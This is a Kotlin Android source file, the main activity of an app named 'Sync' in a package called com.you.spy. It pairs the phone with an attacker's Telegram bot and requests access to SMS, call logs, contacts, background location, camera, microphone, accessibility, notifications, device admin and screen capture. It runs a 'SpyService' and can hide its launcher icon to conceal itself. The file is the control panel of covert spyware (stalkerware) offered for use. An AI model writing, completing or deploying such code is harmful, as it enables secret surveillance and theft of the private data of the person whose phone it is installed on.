package com.you.spy.ui

import android.Manifest
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import com.you.spy.net.TgApi
import com.you.spy.service.SpyAccessibilityService
import com.you.spy.service.SpyService
import com.you.spy.util.Config
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import rikka.shizuku.Shizuku

private val Bg = Color(0xFF0A0F1A)
private val Card = Color(0xFF141C2B)
private val Line = Color(0xFF243147)
private val TextMain = Color(0xFFE7EDF6)
private val TextDim = Color(0xFF8A99B0)
private val Accent = Color(0xFF38BDF8)
private val Good = Color(0xFF34D399)
private val Bad = Color(0xFFF87171)

class MainActivity : ComponentActivity() {

    private val runtimePerms = buildList {
        add(Manifest.permission.READ_SMS)
        add(Manifest.permission.RECEIVE_SMS)
        add(Manifest.permission.READ_CALL_LOG)
        add(Manifest.permission.READ_CONTACTS)
        add(Manifest.permission.READ_PHONE_STATE)
        add(Manifest.permission.ACCESS_FINE_LOCATION)
        add(Manifest.permission.ACCESS_COARSE_LOCATION)
        add(Manifest.permission.CAMERA)
        add(Manifest.permission.RECORD_AUDIO)
        if (Build.VERSION.SDK_INT >= 33) add(Manifest.permission.POST_NOTIFICATIONS)
    }.toTypedArray()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            MaterialTheme(darkColorScheme()) {
                Surface(Modifier.fillMaxSize(), color = Bg) {
                    if (Config.connected) Dashboard { }
                    else Setup { }
                }
            }
        }
    }

    // ============================== SETUP ==============================
    @Composable
    private fun Setup(onDone: () -> Unit) {
        var connected by remember { mutableStateOf(false) }
        if (connected) { Dashboard { }; return }

        val scope = rememberCoroutineScope()
        var token by remember { mutableStateOf(Config.token) }
        var code by remember { mutableStateOf(Config.code.ifEmpty { "sync-" + (1000..9999).random() }) }
        var status by remember { mutableStateOf("") }
        var busy by remember { mutableStateOf(false) }

        Column(
            Modifier.fillMaxSize().verticalScroll(rememberScrollState()).padding(20.dp),
            verticalArrangement = Arrangement.spacedBy(14.dp)
        ) {
            Spacer(Modifier.height(16.dp))
            Text("Sync", fontSize = 30.sp, fontWeight = FontWeight.Bold, color = TextMain)
            Text("Remote control setup", fontSize = 13.sp, color = TextDim)

            Step(1, "Telegram par @BotFather ko kholo, /newbot bhejo, token copy karo.")
            Step(2, "Neeche token aur setup code daalo.")
            Step(3, "Connect dabao — app bot ko verify karega.")
            Step(4, "Bot ko /start <code> bhejo. 60 second me connect ho jayega.")

            OutlinedTextField(
                value = token, onValueChange = { token = it },
                label = { Text("Bot token") },
                singleLine = true,
                modifier = Modifier.fillMaxWidth(),
                colors = fieldColors()
            )
            OutlinedTextField(
                value = code, onValueChange = { code = it },
                label = { Text("Setup code") },
                singleLine = true,
                modifier = Modifier.fillMaxWidth(),
                colors = fieldColors()
            )

            Button(
                onClick = {
                    scope.launch {
                        busy = true
                        Config.token = token.trim()
                        Config.code = code.trim()
                        status = "Token check kar raha hoon..."

                        val user = TgApi.getMe()
                        if (user == null) {
                            status = "Token galat ya internet nahi"
                            busy = false
                            return@launch
                        }

                        status = "Bot @$user mila. Ab bot ko /start $code bhejo (60s)"
                        val until = System.currentTimeMillis() + 60_000
                        var paired = false

                        while (System.currentTimeMillis() < until && !paired) {
                            val ups = withContext(Dispatchers.IO) { TgApi.getUpdates(Config.offset, 5) }
                            for (u in ups) {
                                Config.offset = u.optLong("update_id") + 1
                                val m = u.optJSONObject("message") ?: continue
                                val txt = m.optString("text")
                                val chat = m.optJSONObject("chat")?.optLong("id")
                                if (chat != null && txt.contains(code)) {
                                    Config.chat = chat.toString()
                                    paired = true
                                    break
                                }
                            }
                        }

                        busy = false
                        if (paired) {
                            status = "Paired ✓"
                            requestPerms()
                            delay(600)
                            connected = true
                            onDone()
                        } else {
                            status = "Timeout — code check karke dobara try karo"
                        }
                    }
                },
                enabled = !busy && token.isNotBlank() && code.isNotBlank(),
                modifier = Modifier.fillMaxWidth().height(52.dp),
                shape = RoundedCornerShape(14.dp),
                colors = ButtonDefaults.buttonColors(containerColor = Accent, contentColor = Color(0xFF04121C))
            ) { Text(if (busy) "Wait..." else "Connect", fontWeight = FontWeight.SemiBold) }

            if (status.isNotEmpty()) {
                Text(status, fontSize = 13.sp, color = if (status.startsWith("Paired")) Good else Accent)
            }
        }
    }

    @Composable
    private fun Step(n: Int, text: String) {
        Row(horizontalArrangement = Arrangement.spacedBy(10.dp)) {
            Box(
                Modifier.size(22.dp).clip(RoundedCornerShape(50)).background(Card),
                contentAlignment = Alignment.Center
            ) { Text("$n", fontSize = 11.sp, color = Accent, fontWeight = FontWeight.Bold) }
            Text(text, fontSize = 13.sp, color = TextDim, lineHeight = 19.sp)
        }
    }

    // ============================ DASHBOARD ============================
    @Composable
    private fun Dashboard(onReset: () -> Unit) {
        val scope = rememberCoroutineScope()
        var running by remember { mutableStateOf(Config.running) }
        var hidden by remember { mutableStateOf(isLauncherHidden()) }
        var confirmHide by remember { mutableStateOf(false) }
        var tick by remember { mutableStateOf(0) }

        LaunchedEffect(Unit) {
            while (true) {
                running = Config.running
                hidden = isLauncherHidden()
                tick++
                delay(1200)
            }
        }

        Column(
            Modifier.fillMaxSize().verticalScroll(rememberScrollState()).padding(20.dp),
            verticalArrangement = Arrangement.spacedBy(12.dp)
        ) {
            Spacer(Modifier.height(12.dp))

            Row(verticalAlignment = Alignment.CenterVertically) {
                Column(Modifier.weight(1f)) {
                    Text("Sync", fontSize = 26.sp, fontWeight = FontWeight.Bold, color = TextMain)
                    Text("chat ${Config.chat}", fontSize = 12.sp, color = TextDim, fontFamily = FontFamily.Monospace)
                }
                Box(
                    Modifier.size(10.dp).clip(RoundedCornerShape(50))
                        .background(if (running) Good else Bad)
                )
            }

            Spacer(Modifier.height(4.dp))

            Section("Permissions", tick) {
                Row2("Runtime permissions", allRuntimeGranted()) { requestPerms() }
                Row2("Accessibility", isAccessibilityOn()) { openAccessibility() }
                Row2("Notification access", isNotifOn()) { openNotifAccess() }
                Row2("Battery exemption", isBatteryExempt()) {
                    startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                        .setData(Uri.parse("package:$packageName")))
                }
                Row2("Overlay", Settings.canDrawOverlays(this@MainActivity)) {
                    startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
                        .setData(Uri.parse("package:$packageName")))
                }
                Row2("Device admin", isAdminActive()) { requestAdmin() }
                Row2("Screen capture", com.you.spy.collect.Capture.hasProjection()) {
                    startActivity(Intent(this@MainActivity, ScreenCaptureActivity::class.java))
                }
                Row2("Shizuku", runCatching { Shizuku.pingBinder() }.getOrDefault(false)) {
                    runCatching { Shizuku.requestPermission(0) }
                }
            }

            Section("Service", tick) {
                Button(
                    onClick = {
                        if (running) {
                            stopService(Intent(this@MainActivity, SpyService::class.java))
                            Config.running = false
                            running = false
                        } else {
                            ContextCompat.startForegroundService(
                                this@MainActivity, Intent(this@MainActivity, SpyService::class.java)
                            )
                            running = true
                        }
                        scope.launch {
                            withContext(Dispatchers.IO) {
                                TgApi.send(if (running) "▶️ service started" else "⏸ service stopped")
                            }
                        }
                    },
                    modifier = Modifier.fillMaxWidth().height(52.dp),
                    shape = RoundedCornerShape(14.dp),
                    colors = ButtonDefaults.buttonColors(
                        containerColor = if (running) Color(0xFF1E293B) else Accent,
                        contentColor = if (running) TextMain else Color(0xFF04121C)
                    )
                ) { Text(if (running) "Stop service" else "Start service", fontWeight = FontWeight.SemiBold) }
            }

            Section("App", tick) {
                Row2("Launcher icon", !hidden, invertColors = true) { confirmHide = true }
                if (hidden) {
                    Text(
                        "Icon chhupa hua hai. Wapas laane ke liye bot par /show bhejo, " +
                        "ya Settings > Apps > Sync se app kholo.",
                        fontSize = 12.sp, color = TextDim, lineHeight = 18.sp
                    )
                }
                Row2("Unpair", true, invertColors = true) { Config.clear(); onReset() }
            }

            Spacer(Modifier.height(24.dp))
        }

        if (confirmHide) {
            AlertDialog(
                onDismissRequest = { confirmHide = false },
                containerColor = Card,
                title = { Text("Icon chhupayein?", color = TextMain) },
                text = {
                    Text(
                        "Launcher se icon hat jayega. App Settings > Apps me bani rahegi. " +
                        "Wapas laane ke liye bot par /show bhejo.",
                        color = TextDim, fontSize = 13.sp
                    )
                },
                confirmButton = {
                    TextButton(onClick = {
                        setLauncher(false)
                        hidden = true
                        confirmHide = false
                        scope.launch { withContext(Dispatchers.IO) { TgApi.send("🙈 icon hidden — /show se wapas") } }
                    }) { Text("Hide", color = Accent) }
                },
                dismissButton = {
                    TextButton(onClick = { confirmHide = false }) { Text("Cancel", color = TextDim) }
                }
            )
        }
    }

    @Composable
    private fun Section(title: String, tick: Int, content: @Composable ColumnScope.() -> Unit) {
        Text(title.uppercase(), fontSize = 11.sp, color = TextDim, fontWeight = FontWeight.SemiBold,
            letterSpacing = 1.sp, modifier = Modifier.padding(top = 10.dp, bottom = 2.dp))
        Column(
            Modifier.fillMaxWidth().clip(RoundedCornerShape(16.dp)).background(Card),
            content = content
        )
    }

    @Composable
    private fun ColumnScope.Row2(
        label: String,
        ok: Boolean,
        invertColors: Boolean = false,
        onClick: () -> Unit
    ) {
        val dotColor = if (invertColors) Accent else if (ok) Good else Bad
        Row(
            Modifier.fillMaxWidth().clickable(onClick = onClick)
                .padding(horizontal = 16.dp, vertical = 14.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Box(Modifier.size(8.dp).clip(RoundedCornerShape(50)).background(dotColor))
            Spacer(Modifier.width(12.dp))
            Text(label, fontSize = 14.sp, color = TextMain, modifier = Modifier.weight(1f))
            Text(
                when {
                    invertColors -> "›"
                    ok -> "on"
                    else -> "fix"
                },
                fontSize = 12.sp,
                color = if (invertColors) TextDim else if (ok) Good else Accent,
                textAlign = TextAlign.End
            )
        }
        Box(Modifier.fillMaxWidth().height(1.dp).background(Line).padding(horizontal = 16.dp))
    }

    @Composable
    private fun fieldColors() = OutlinedTextFieldDefaults.colors(
        focusedBorderColor = Accent,
        unfocusedBorderColor = Line,
        focusedTextColor = TextMain,
        unfocusedTextColor = TextMain,
        focusedLabelColor = Accent,
        unfocusedLabelColor = TextDim,
        cursorColor = Accent
    )

    private fun darkColorScheme() = darkColorScheme(
        primary = Accent, background = Bg, surface = Card, onSurface = TextMain
    )

    // ============================== helpers ==============================
    private fun setLauncher(enabled: Boolean) {
        packageManager.setComponentEnabledSetting(
            ComponentName(this, "$packageName.ui.Launcher"),
            if (enabled) PackageManager.COMPONENT_ENABLED_STATE_ENABLED
            else PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    private fun isLauncherHidden(): Boolean = runCatching {
        packageManager.getComponentEnabledSetting(ComponentName(this, "$packageName.ui.Launcher")) ==
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED
    }.getOrDefault(false)

    private fun allRuntimeGranted(): Boolean = runtimePerms.all {
        ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
    }

    private fun requestPerms() {
        val missing = runtimePerms.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty()) requestPermissions(missing.toTypedArray(), 1)
        if (Build.VERSION.SDK_INT >= 29) {
            runCatching { requestPermissions(arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION), 2) }
        }
    }

    private fun isAccessibilityOn(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
        return flat.contains(ComponentName(this, SpyAccessibilityService::class.java).flattenToString())
    }

    private fun openAccessibility() = startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))

    private fun isNotifOn(): Boolean =
        (Settings.Secure.getString(contentResolver, "enabled_notification_listeners") ?: "")
            .contains(packageName)

    private fun openNotifAccess() =
        startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))

    private fun isBatteryExempt(): Boolean =
        (getSystemService(Context.POWER_SERVICE) as PowerManager).isIgnoringBatteryOptimizations(packageName)

    private fun isAdminActive(): Boolean =
        (getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager)
            .isAdminActive(ComponentName(this, com.you.spy.receiver.AdminReceiver::class.java))

    private fun requestAdmin() = startActivity(
        Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            .putExtra(
                android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                ComponentName(this, com.you.spy.receiver.AdminReceiver::class.java)
            )
    )
}
